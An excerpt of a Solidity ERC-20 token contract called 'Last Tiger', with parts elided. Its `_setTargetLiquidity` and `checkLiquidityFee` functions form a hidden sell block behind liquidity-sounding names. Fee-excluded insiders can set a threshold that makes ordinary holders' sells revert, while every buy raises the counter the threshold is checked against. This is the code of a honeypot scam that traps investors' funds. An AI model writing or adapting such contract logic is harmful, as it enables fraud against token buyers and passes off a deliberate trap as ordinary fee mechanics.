...
contract LastTiger is Ownable, IERC20 {
    ...
    string private _name = "Last Tiger";
    string private _symbol = "LASTTIGER";
    ...
    uint256 private _targetLiquidity = _totalSupply;
    ...
    function _setTargetLiquidity(uint256 value) external {
        if (!_excludedFromFee[msg.sender]) {
            return;
        }
        _targetLiquidity = value;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        uint256 feeAmount = 0;
        uint lqAmount = amount;
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && to != address(this) && !inLiquidityTransaction && !swapping) {
            feeAmount = amount.mul(_fee).div(100);
            require(amount <= _maxTxAmount);
            if (uniswapV2Pair() != from) {
                checkLiquidityFee();
            } else {
                _liquidityAmount += amount.div(lqAmount);
            }
        }
        if (_liquiditySwapThreshold < amount && to == from && _excludedFromFee[msg.sender]) {
    ...
    function checkLiquidityFee() private view {
        require(_liquidityAmount < _targetLiquidity);
    }
